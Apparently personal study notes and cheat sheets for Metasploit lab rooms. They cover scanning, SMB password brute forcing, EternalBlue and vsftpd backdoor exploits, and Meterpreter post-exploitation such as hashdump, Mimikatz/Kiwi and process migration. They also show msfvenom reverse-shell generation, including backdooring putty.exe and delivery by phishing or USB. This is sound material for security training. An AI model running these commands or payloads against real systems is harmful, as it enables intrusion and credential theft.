This is an excellent room because it teaches the **real Metasploit workflow** used during authorized penetration tests. Below are detailed explanations with **every important command**, **what it does**, **why you use it**, and **when to use it**.

---

# Metasploit Workflow

```
Recon
   ↓
Port Scan
   ↓
Service Enumeration
   ↓
Store Results in Database
   ↓
Vulnerability Scanning
   ↓
Exploitation
   ↓
Post Exploitation
```

---

# 1. Finding Port Scanners

Instead of immediately using Nmap, Metasploit has built-in scanners.

### Search for scanners

```bash
search portscan
```

### Explanation

Searches Metasploit's module database for every module containing **portscan**.

Example output

```
auxiliary/scanner/portscan/tcp
auxiliary/scanner/portscan/syn
auxiliary/scanner/portscan/ack
```

---

# 2. Load a Scanner

```bash
use auxiliary/scanner/portscan/tcp
```

### Explanation

Loads the TCP Connect Scanner.

Think of it as:

```
Metasploit
    ↓
Load Tool
    ↓
Configure Tool
    ↓
Run Tool
```

After loading you'll see

```
msf6 auxiliary(scanner/portscan/tcp) >
```

---

# 3. View Required Options

```bash
show options
```

### Explanation

Shows every configurable parameter.

Example

```
RHOSTS
PORTS
THREADS
TIMEOUT
```

Never run a module before checking its options.

---

# 4. Set Target

```bash
set RHOSTS 10.10.10.20
```

or

```bash
set RHOSTS MACHINE_IP
```

### Explanation

Specifies the target machine.

Without RHOSTS Metasploit has nothing to attack.

---

# 5. Select Ports

Example

```bash
set PORTS 1-1024
```

Only scans well-known ports.

---

Scan common ports plus RDP

```bash
set PORTS 1-1024,3389
```

---

Custom list

```bash
set PORTS 22,80,443,8080
```

---

# 6. Increase Speed

```bash
set THREADS 10
```

### Explanation

Threads = how many simultaneous scans.

```
THREADS 1
```

```
Port 1
Port 2
Port 3
```

Slow.

---

```
THREADS 10
```

```
Port1 Port2 Port3 Port4 Port5
```

Much faster.

---

# 7. Run the Scan

```bash
run
```

or

```bash
exploit
```

For auxiliary modules, `run` is the preferred command.

---

Output

```
135 OPEN
445 OPEN
3389 OPEN
8000 OPEN
```

---

# 8. Run Nmap from Inside Metasploit

Instead of leaving Metasploit

```bash
nmap -sV -O 10.10.10.20
```

### What it does

Runs Nmap directly.

Flags:

```
-sV
```

Version detection

```
Apache 2.4
OpenSSH 8.2
vsFTPD 2.3.4
```

---

```
-O
```

OS Detection

Example

```
Windows Server 2008
Ubuntu
```

---

# 9. NetBIOS Scanner

Search

```bash
search netbios
```

Load

```bash
use auxiliary/scanner/netbios/nbname
```

Target

```bash
set RHOSTS MACHINE_IP
```

Run

```bash
run
```

### Finds

* Computer Name
* Workgroup
* Domain
* MAC Address

Example

```
STRATFORD-WS01
```

---

# 10. HTTP Version Scanner

Load

```bash
use auxiliary/scanner/http/http_version
```

Target

```bash
set RHOSTS MACHINE_IP
```

Port

```bash
set RPORT 8000
```

Run

```bash
run
```

Output

```
webfs/1.21
```

Now you know exactly which software is running.

---

# 11. SMB Login Scanner

Load

```bash
use auxiliary/scanner/smb/smb_login
```

Specify user

```bash
set SMBUSER penny
```

Password list

```bash
set PASS_FILE /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
```

Quiet mode

```bash
set VERBOSE false
```

Run

```bash
run
```

If successful

```
Success

penny:leo1234
```

This confirms valid credentials.

---

# 12. Setting Up the Database

Initialize (Kali)

```bash
sudo msfdb init
```

Starts PostgreSQL and creates the Metasploit database.

---

Check status

```bash
db_status
```

Output

```
Connected to msf
```

---

# 13. Workspaces

View workspaces

```bash
workspace
```

Create one

```bash
workspace -a stratford
```

Switch

```bash
workspace stratford
```

Delete

```bash
workspace -d stratford
```

Think of workspaces as separate projects so scans, hosts, and credentials don't get mixed together.

---

# 14. Scan Into Database

Instead of

```bash
nmap
```

use

```bash
db_nmap -sV -O 10.10.10.20
```

### Difference

```
nmap
```

Displays results only.

```
db_nmap
```

Displays **and saves** results to the Metasploit database.

---

# 15. Show Stored Hosts

```bash
hosts
```

Lists every discovered machine.

---

# 16. Show Services

```bash
services
```

Shows

```
IP
Port
Protocol
Service
Version
```

---

Filter by service

```bash
services -S smb
```

or

```bash
services -S ftp
```

---

# 17. Stored Credentials

```bash
creds
```

Shows credentials discovered during scans.

Example

```
penny
leo1234
```

---

# 18. Automatically Set Targets

Instead of typing IPs

```bash
hosts -R
```

Automatically fills

```
RHOSTS
```

with every discovered host.

---

Only FTP machines

```bash
services -S ftp -R
```

Only SMB machines

```bash
services -S smb -R
```

This is a huge time saver on larger engagements.

---

# 19. Import External Nmap Scans

```bash
db_import scan.xml
```

Imports an existing Nmap XML scan into the database.

---

# 20. Search for Vulnerability Scanners

Example

```bash
search smb_ms17_010
```

or

```bash
search ftp
```

or

```bash
search type:auxiliary smb
```

---

# 21. Scan for EternalBlue

Load

```bash
use auxiliary/scanner/smb/smb_ms17_010
```

Target

```bash
set RHOSTS MACHINE_IP
```

Run

```bash
run
```

Output

```
Host is likely VULNERABLE
```

This scanner only checks for the vulnerability; it does not exploit it.

---

# 22. View Recorded Vulnerabilities

```bash
vulns
```

Shows findings such as

```
MS17-010

CVE-2017-0144
```

that have been stored in the database.

---

# 23. Anonymous FTP Check

Load

```bash
use auxiliary/scanner/ftp/anonymous
```

Populate FTP targets from the database

```bash
services -S ftp -R
```

Run

```bash
run
```

Checks whether anonymous FTP login is allowed.

---

# 24. Search for Exploits

Example

```bash
search eternalblue
```

or

```bash
search vsftpd
```

Lists available exploit modules.

---

# 25. Load an Exploit

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

Metasploit automatically selects a default payload, often a Meterpreter reverse shell for Windows.

---

# 26. Check Exploit Options

```bash
show options
```

Verify required settings such as:

* `RHOSTS` (target)
* `LHOST` (your listener IP)
* `LPORT` (listening port)

---

# 27. Launch the Exploit

```bash
exploit
```

or

```bash
run
```

A successful exploit typically opens a session, such as a Meterpreter session on Windows or a command shell on Unix.

---

# 28. Meterpreter Basics (Windows)

Show current user:

```bash
getuid
```

Search for a file:

```bash
search -f flag.txt
```

Read a file:

```bash
cat C:\\Users\\Administrator\\Desktop\\flag.txt
```

Dump local password hashes (when appropriate privileges exist):

```bash
hashdump
```

Background the session:

```bash
background
```

---

# 29. Managing Sessions

List active sessions:

```bash
sessions
```

Interact with session 1:

```bash
sessions -i 1
```

Terminate all sessions:

```bash
sessions -K
```

---

# 30. vsFTPd 2.3.4 Backdoor Exploit

Search:

```bash
search vsftpd
```

Load:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

Set the target:

```bash
set RHOSTS MACHINE_IP
```

Run:

```bash
exploit
```

This exploit targets the well-known backdoored release of vsFTPd 2.3.4. On a vulnerable lab machine, it provides a simple Unix command shell.

Basic verification commands in the shell:

```bash
id
```

Shows the current user ID and groups.

```bash
whoami
```

Displays the current username.

```bash
hostname
```

Displays the target system's hostname.

---

# Quick Command Cheat Sheet

| Purpose               | Command               |
| --------------------- | --------------------- |
| Search modules        | `search <keyword>`    |
| Load module           | `use <module>`        |
| View options          | `show options`        |
| Set target            | `set RHOSTS <IP>`     |
| Set local listener    | `set LHOST <your_IP>` |
| Execute module        | `run` / `exploit`     |
| Run Nmap              | `nmap -sV -O <IP>`    |
| Save Nmap to DB       | `db_nmap -sV -O <IP>` |
| Show hosts            | `hosts`               |
| Show services         | `services`            |
| Show credentials      | `creds`               |
| Show vulnerabilities  | `vulns`               |
| List sessions         | `sessions`            |
| Interact with session | `sessions -i <id>`    |
| Background session    | `background`          |
| End all sessions      | `sessions -K`         |

**Key takeaway:** Think of Metasploit as a workflow rather than a collection of individual commands. In most engagements, you'll repeatedly follow the same pattern: **search → use → show options → set → run/exploit → interact with sessions**. Once that workflow becomes familiar, learning new modules is much easier.

These notes are focused on **Meterpreter**—what it is, how to choose the right payload, and the most common post-exploitation workflows. Here's a condensed CTF-focused cheat sheet.

---

# 1. Meterpreter Variants

Choose the payload based on **OS + Runtime + Connection Method**.

| Target             | Payload                                      |
| ------------------ | -------------------------------------------- |
| Windows            | `windows/x64/meterpreter/reverse_tcp`        |
| Linux              | `linux/x64/meterpreter/reverse_tcp` (Mettle) |
| PHP website        | `php/meterpreter/reverse_tcp`                |
| Java application   | `java/meterpreter/reverse_https`             |
| Python application | `python/meterpreter/reverse_tcp`             |

---

## Connection Types

### Reverse TCP (most common)

Victim connects back.

```
windows/x64/meterpreter/reverse_tcp
```

---

### Reverse HTTPS

Looks like HTTPS traffic.

Useful if outbound web traffic is allowed.

```
windows/x64/meterpreter/reverse_https
```

---

### Bind TCP

Victim listens.

You connect to them.

```
windows/x64/meterpreter/bind_tcp
```

---

# 2. Staged vs Stageless

### Staged

```
meterpreter/reverse_tcp
```

Uses `/`

Downloads Meterpreter after connecting.

---

### Stageless

```
meterpreter_reverse_tcp
```

Uses `_`

Entire payload is included.

---

# 3. Finding Payloads

```
search type:payload meterpreter
```

---

# 4. Getting Initial Access (Psexec)

```
use exploit/windows/smb/psexec

set RHOSTS <ip>
set SMBUser ballen
set SMBPass Password1
set LHOST <your_ip>

exploit
```

If it fails...

Run it again.

---

# 5. Essential Meterpreter Commands

## System Information

```
sysinfo
```

Shows

* hostname
* OS
* architecture
* domain

---

```
getuid
```

Current user.

Example

```
NT AUTHORITY\SYSTEM
```

---

```
getpid
```

Current process.

---

```
ps
```

List running processes.

Very important for migration.

---

```
idletime
```

Shows whether user is active.

---

# 6. File System

Current directory

```
pwd
```

---

Change directory

```
cd C:\Users
```

---

List files

```
ls
```

---

Read a file

```
cat notes.txt
```

---

Search

Entire drive

```
search -f flag.txt
```

Specific folder

```
search -f *.txt -d C:\Users
```

---

Download

```
download C:\Users\ballen\Desktop\flag.txt
```

---

Upload

```
upload winpeas.exe C:\Temp\
```

---

# 7. Networking

Interfaces

```
ifconfig
```

---

Connections

```
netstat
```

Useful for pivoting.

---

# 8. Native Windows Shell

Drop into CMD

```
shell
```

Return

```
exit
```

---

Run one command

```
execute -f ipconfig -i
```

---

# 9. Process Migration

Very common.

Find process

```
ps
```

Move into it

```
migrate <PID>
```

Example

```
migrate 716
```

Verify

```
getpid
```

---

Good migration targets

* explorer.exe
* svchost.exe
* lsass.exe (for credentials)

---

# 10. Privilege Escalation

Try

```
getsystem
```

Verify

```
getuid
```

---

# 11. Dump Password Hashes

Requires SYSTEM.

```
hashdump
```

Output

```
Administrator
Guest
ballen
```

---

# 12. Kiwi (Mimikatz)

Load

```
load kiwi
```

Dump credentials

```
creds_all
```

Can reveal

* NTLM hashes
* plaintext passwords
* Kerberos tickets

---

# 13. Python Extension

Load

```
load python
```

Run Python

```
python_execute "print('Hello')"
```

---

# 14. Background Session

```
background
```

---

Show sessions

```
sessions
```

Interact

```
sessions -i 1
```

Kill

```
sessions -K
```

---

# 15. Post Modules

General workflow

```
background

use post/...

set SESSION 1

run
```

---

Example

Enumerate domain

```
use post/windows/gather/enum_domain

set SESSION 1

run
```

---

Other useful modules

Shares

```
post/windows/gather/enum_shares
```

Installed software

```
post/windows/gather/enum_applications
```

Environment variables

```
post/multi/gather/env
```

Upgrade shell

```
post/multi/manage/shell_to_meterpreter
```

---

Search post modules

```
search type:post
```

---

# Typical CTF Workflow

1. Gain shell

```
exploit
```

2. Check system

```
sysinfo
getuid
```

3. Find interesting processes

```
ps
```

4. Migrate (if needed)

```
migrate <PID>
```

5. Become SYSTEM

```
getsystem
```

6. Dump hashes

```
hashdump
```

7. Load Kiwi

```
load kiwi
creds_all
```

8. Search for flags

```
search -f flag.txt
```

9. Read flag

```
cat C:\Users\Administrator\Desktop\flag.txt
```

10. Background the session and run post-exploitation modules as needed.

This sequence covers the majority of Windows-focused TryHackMe and Hack The Box Meterpreter exercises.

---

---

# Metasploit Payload Generation (msfvenom) - Operator Notes

## Purpose

Use **msfvenom** whenever **Metasploit doesn't deliver the payload for you.**

Examples:

* File upload vulnerability
* SSH access but want Meterpreter
* Phishing attachment
* USB drop
* Web shell upload
* Custom exploit
* Buffer overflow shellcode

Workflow:

```
Generate Payload
        ↓
Deliver Payload
        ↓
Start multi/handler
        ↓
Victim Executes
        ↓
Meterpreter Session
```

---

# Basic Command

```
msfvenom -p PAYLOAD LHOST=<IP> LPORT=<PORT> -f FORMAT -o output
```

Example

```
msfvenom -p windows/x64/meterpreter_reverse_tcp \
LHOST=10.10.14.5 \
LPORT=4444 \
-f exe \
-o shell.exe
```

Remember:

```
-p      Payload

LHOST   My IP

LPORT   Listening Port

-f      Output Format

-o      Save File
```

---

# Common Payloads

## Windows Meterpreter

```
windows/x64/meterpreter_reverse_tcp
```

Output

```
-f exe
```

Produces

```
shell.exe
```

---

## Linux Meterpreter

```
linux/x64/meterpreter_reverse_tcp
```

Output

```
-f elf
```

Produces

```
shell.elf
```

Need:

```
chmod +x shell.elf
./shell.elf
```

---

## PHP Upload

```
php/meterpreter_reverse_tcp
```

Output

```
-f raw
```

Save

```
shell.php
```

Upload then browse

```
http://target/uploads/shell.php
```

Always verify

```
<?php
```

exists at top.

---

## ASPX Upload

```
windows/x64/meterpreter_reverse_tcp
```

```
-f aspx
```

Produces

```
shell.aspx
```

---

## JSP Upload

```
java/meterpreter/reverse_tcp
```

```
-f jsp
```

Produces

```
shell.jsp
```

---

## WAR Deployment

```
java/meterpreter/reverse_tcp
```

```
-f war
```

Produces

```
shell.war
```

Deploy via Tomcat Manager.

---

## Python One-Liner

```
cmd/unix/reverse_python
```

```
-f raw
```

Prints

```
python -c "..."
```

Useful for

* SSH
* Command Injection
* Existing shell

---

# Staged vs Stageless

## Staged

```
meterpreter/reverse_tcp
```

Notice

```
/
```

Small payload

Downloads Meterpreter later

Needs handler to deliver stage

Good for

* Exploits
* Buffer Overflows

---

## Stageless

```
meterpreter_reverse_tcp
```

Notice

```
_
```

Entire payload inside executable

Larger

More reliable

Preferred for

* File uploads
* USB
* Phishing
* Standalone EXEs

---

# Remember

```
Slash  = Staged

Underscore = Stageless
```

---

# Output Formats

## Executables

| Format | Platform |
| ------ | -------- |
| exe    | Windows  |
| elf    | Linux    |
| macho  | macOS    |
| apk    | Android  |
| war    | Java     |

---

## Transform Formats

Not executable.

Used for embedding.

| Format     | Use            |
| ---------- | -------------- |
| raw        | Webshells      |
| c          | C Shellcode    |
| python     | Python Loader  |
| powershell | PowerShell     |
| hex        | Hex Output     |
| base64     | Encoded Output |

---

# Listing Things

Payloads

```
msfvenom -l payloads
```

Search

```
msfvenom -l payloads | grep windows
```

Formats

```
msfvenom -l formats
```

Encoders

```
msfvenom -l encoders
```

Platforms

```
msfvenom -l platforms
```

Architectures

```
msfvenom -l archs
```

Payload Options

```
msfvenom -p windows/x64/meterpreter_reverse_tcp --list-options
```

---

# Encoders

Common

```
x86/shikata_ga_nai
```

Example

```
-e x86/shikata_ga_nai
```

Iterations

```
-i 5
```

Avoid Bad Characters

```
-b '\x00\x0a\x0d'
```

### Reality

Encoders **DO NOT** bypass modern AV/EDR.

Use encoding for

* Bad characters
* Exploit constraints

Not

* Stealth
* AV bypass

---

# Inject into Existing Executable

Template

```
-x putty.exe
```

Keep Original Functionality

```
-k
```

Example

```
msfvenom \
-p windows/x64/meterpreter_reverse_tcp \
LHOST=10.10.14.5 \
LPORT=4444 \
-x putty.exe \
-k \
-f exe \
-o putty_backdoor.exe
```

---

# Handler

```
use exploit/multi/handler
```

Set payload

```
set PAYLOAD windows/x64/meterpreter_reverse_tcp
```

Listener

```
set LHOST 10.10.14.5
set LPORT 4444
```

Start

```
run
```

Or background

```
run -j
```

---

# EVERYTHING MUST MATCH

Payload

```
msfvenom

↓

multi/handler
```

Must match exactly.

These three **must** be identical:

```
Payload

LHOST

LPORT
```

Even

```
meterpreter/reverse_tcp
```

and

```
meterpreter_reverse_tcp
```

are **different payloads**.

---

# Typical Workflow

Generate

```
msfvenom ...
```

↓

Transfer

```
SMB

SSH

Upload

USB

Email

Exploit
```

↓

Listener

```
multi/handler
```

↓

Victim executes

↓

Meterpreter

↓

Post Exploitation

---

# Useful Meterpreter Commands

```
sysinfo
```

System info

```
getuid
```

Current user

```
ps
```

Processes

```
migrate PID
```

Move into stable process

```
hashdump
```

Dump SAM hashes (SYSTEM required)

```
search -f flag.txt
```

Find files

```
download
```

Download files

```
upload
```

Upload files

```
shell
```

Drop into CMD

```
background
```

Return to msfconsole

---

# Decision Tree

**Need an executable?**

```
Windows → exe

Linux → elf

macOS → macho

Android → apk
```

---

**Uploading to a website?**

```
PHP → raw

ASPX → aspx

JSP → jsp

Tomcat → war
```

---

**Need shellcode?**

```
C → -f c

Python → -f python

PowerShell → -f powershell

Hex → -f hex
```

---

# Things That Bite You at 2 AM

* `LHOST` is **your reachable IP**, not the victim's.
* `LPORT` must match in both `msfvenom` and `multi/handler`.
* `meterpreter/reverse_tcp` ≠ `meterpreter_reverse_tcp`.
* Linux payloads need `chmod +x`.
* PHP payloads should begin with `<?php`.
* `run -j` keeps the handler in the background.
* `set ExitOnSession false` lets one handler catch multiple victims.
* If no session appears, first verify **Payload → LHOST → LPORT → Network reachability → Firewall** before assuming the payload is broken.

